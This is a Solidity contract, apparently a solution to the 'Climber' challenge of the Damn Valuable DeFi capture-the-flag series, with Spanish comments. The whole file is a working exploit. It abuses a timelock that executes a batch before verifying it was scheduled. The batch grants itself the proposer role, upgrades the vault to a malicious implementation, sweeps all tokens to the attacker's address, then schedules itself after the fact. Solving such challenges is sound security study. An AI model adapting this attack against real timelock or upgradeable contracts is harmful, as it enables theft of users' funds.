// SPDX-License-Identifier: MIT

import "../climber/ClimberEvilVault.sol";
import "../../DamnValuableToken.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.0;

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberTimelockAttacker {
    //Firmas de funciones que usaremos

    string constant SCHEDULE_SIGNATURE = "schedule(address[],uint256[],bytes[],bytes32)";
    string constant EXECUTE_SIGNATURE = "execute(address[],uint256[],bytes[],bytes32)";
    string constant GRANT_ROLE_SIGNATURE = "grantRole(bytes32,address)";
    string constant UPGRADE_SIGNATURE = "upgradeTo(address)";
    string constant ATTACK_SIGNATURE = "attack()";

    address public _owner;
    IClimberTimelock public _timelock;
    address public _vault;
    address public _evilVault;
    address public _token;

    address[] public targets = new address[](3); // grantRole? timelock -- upgradeTo? vault -- sweepFunds? vault (que ya fue upgradeado a evilVault)
    bytes[] public datas = new bytes[](3); //
    uint256[] public values = new uint256[](3); //Innecesario completar con valores.
    bytes32 constant salt = keccak256("SALADO");

    constructor(
        address vault,
        address payable timelock,
        address evilVault,
        address token
    ) {
        _owner = msg.sender;
        _vault = vault;
        _timelock = IClimberTimelock(timelock);
        _evilVault = evilVault;
        _token = token;
    }

    function iniciarBatchDeFunciones() public {
        bytes memory grantRoleData = abi.encodeWithSignature(
            GRANT_ROLE_SIGNATURE,
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        bytes memory upgradeToData = abi.encodeWithSignature(
            UPGRADE_SIGNATURE,
            _evilVault
        );
        bytes memory attackData = abi.encodeWithSignature(ATTACK_SIGNATURE);

        targets[0] = address(_timelock);
        datas[0] = grantRoleData;
        values[0] = 0;

        targets[1] = _vault;
        datas[1] = upgradeToData;
        values[1] = 0;

        targets[2] = address(this);
        datas[2] = attackData;
        values[2] = 0;

        _timelock.execute(targets, values, datas, salt);
    }

    function attack() public {
        console.log("ENTRE AL ATTACK");
        //Este sweepFunds se tomará del contrato ClimberEviltVault.
        ClimberEvilVault(_vault).sweepFunds(_token);

        //Envíamos los fondos a la cuenta atacante
        DamnValuableToken(_token).transfer(
            _owner,
            DamnValuableToken(_token).balanceOf(address(this))
        );
        //Finalmente no nos olvidamos de agregar la operacion que contiene el batch de funciones al schedule
        //para que tenga el OperationState.ReadyForExecution y satisfaga el require final.
        _timelock.schedule(targets, values, datas, salt);
    }

    receive() external payable {}
}
